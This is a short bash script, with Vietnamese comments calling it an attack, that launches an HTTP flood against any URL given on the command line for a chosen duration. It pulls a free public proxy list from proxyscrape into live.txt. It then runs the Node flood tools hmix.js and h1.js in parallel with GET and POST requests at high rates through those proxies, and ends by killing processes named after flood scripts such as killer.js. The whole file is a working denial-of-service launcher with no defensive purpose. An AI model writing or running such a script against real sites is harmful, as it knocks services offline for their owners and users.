#!/bin/bash

# Usage: ./script.sh <URL> <TIME>
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy HTTP thẳng vào live.txt
curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=2000" > live.txt

export NODE_OPTIONS=--max-old-space-size=8192

# Chạy tấn công với hmix.js
for method in GET POST; do 
  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 999 --full true -d false &
done

# Chạy tấn công với h1.js
for method in GET POST; do 
  node h1.js "$method" "$URL" live.txt "$TIME" 999 24 randomstring=true &
done
wait
pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
